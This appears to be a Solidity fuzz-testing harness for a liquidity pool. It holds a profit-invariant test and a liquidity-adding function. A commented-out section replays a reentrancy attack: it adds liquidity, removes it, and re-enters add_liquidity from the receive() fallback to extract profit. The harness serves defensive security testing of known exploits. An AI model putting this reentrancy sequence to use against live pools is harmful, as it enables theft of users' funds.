// SPDX-License-Identifier: MIT
import {FuzzSetup} from "./FuzzSetup.sol";

contract Fuzz is FuzzSetup {
    bool performReentrancy = false;

    constructor() payable FuzzSetup() {}

    function testProfit() public {
        uint256 balance = address(this).balance;

        log("initial balance", initialBalance);
        log("current balance", balance);

        eq(initialBalance, balance, "Profit test");
    }

    function addLiquidity(uint256 _amount) public {
        _amount = clampBetween(_amount, 0, address(this).balance);

        uint256[2] memory amount;
        amount[0] = _amount;
        amount[1] = 0;

        pool.add_liquidity{value: _amount}(amount, 0);
    }

    // function replayHack() public {
    //     uint256 balance = address(this).balance;
    //     log("initial balance", balance);
    //
    //     uint256[2] memory amount;
    //     amount[0] = 40_000 ether;
    //     amount[1] = 0;
    //     pool.add_liquidity{value: 40_000 ether}(amount, 0);
    //     log("balance after add liquidity", address(this).balance);
    //
    //     performReentrancy = true;
    //     amount[0] = 0;
    //     pool.remove_liquidity(pool.balanceOf(address(this)), amount);
    //     performReentrancy = false;
    //     log("balance after remove liquidity #1", address(this).balance);
    //
    //     pool.remove_liquidity(10_272 ether, amount);
    //     log("balance after remove liquidity #2", address(this).balance);
    //
    //     log("final balance", address(this).balance);
    //     log("profit", address(this).balance - balance);
    // }

    // receive() external payable {
    //     if (performReentrancy) {
    //         uint256[2] memory amount;
    //         amount[0] = 40_000 ether;
    //         amount[1] = 0;
    //         pool.add_liquidity{value: 40_000 ether}(amount, 0);
    //
    //         log(
    //             "balance after add liquidity (reentrancy)",
    //             address(this).balance
    //         );
    //     }
    // }
}
